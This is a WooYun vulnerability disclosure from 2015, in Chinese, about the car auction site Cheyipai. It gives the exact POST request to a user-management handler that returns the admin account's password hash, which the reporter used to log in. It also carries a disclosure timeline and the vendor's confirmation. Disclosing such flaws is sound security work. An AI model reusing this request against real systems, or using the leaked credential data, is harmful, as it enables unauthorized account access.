wybug_title: 车易拍某处泄露管理用户密码
wybug_detail:
漏洞详情 披露状态：   									2015-05-06：	细节已通知厂商并且等待厂商处理中									2015-05-06：	厂商已经确认，细节仅向厂商公开									2015-05-16：	细节向核心白帽子及相关领域专家公开									2015-05-26：	细节向普通白帽子公开									2015-06-05：	细节向实习白帽子公开									2015-06-20：	细节向公众公开  简要描述： 车易拍某处泄露管理用户密码 详细说明：  问题出在http://xcpmg.cheyipai.com/Login.aspx

点击忘记密码时抓包
POST http://xcpmg.cheyipai.com/httpHandler/UserManagement/UserHandler.ashx userName=admin&src=getuserinfo
可以看到返回了用户信息，包括密码等
[{"Id":"1","ORID":"1","OGID":"18","UserName":"admin","Password":"EA3FD6542032D7A6C5B889F676E15421","RealName":"ç®¡çå","IsSuper":"True","IsLoginShow":"False","IsLoginPriceSearch":"False","RoleTag":"1","Locked":"True","DeleteTag":"False","Updated":"2012/8/8 10:59:57","Created":"2010/9/5 15:22:54","OperatorId":"0","ShopType":"0","ShopParentId":"1","ShopIds":"","ShopTag":"0","CompanyName":"","ContactName":"","ContactTels":"","SendTag":"0","SendTimes":"0","ContactMails":"","Functions":"","ChannelRole":"0","AreaId":"","USER_ID":"000001","USER_IPHONE":"","USER_FAX":"","USER_ADDR":"","REMARK":"","UPDATE_CD":"","ENTRY_DATE":"","GENDER":"","MARRIAGE_STATUS":"","EDUCATION":"","GRADUATE_SCHOOL":"","SPECIALTY":"","BIRTHDAY":"","REGISTERED":"","QUIT_DATE":"","CREATE_CD":"","IS_MODPW":"","PDefaultFunction":"0","UserType":"","ShopTagDate":"","Password2":"","COMID":"1","IsWork":"False","SReplaceTag":"0","Server_IAGUID":"","Server_Seed":"","DES_Key":"","RequestValue":"","StrRandom":"","Key_Status":"","Is_ValidUseCode":"1","UseValidCodeTime":"","ContactPhones":"","IsAreaMrg":""}]
利用此漏洞成功登录某账户

   漏洞证明：  如上   修复方案：  禁止返回敏感数据   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-05-06 11:45 厂商回复： 感谢关注并提交漏洞，已开始排查 最新状态： 暂无
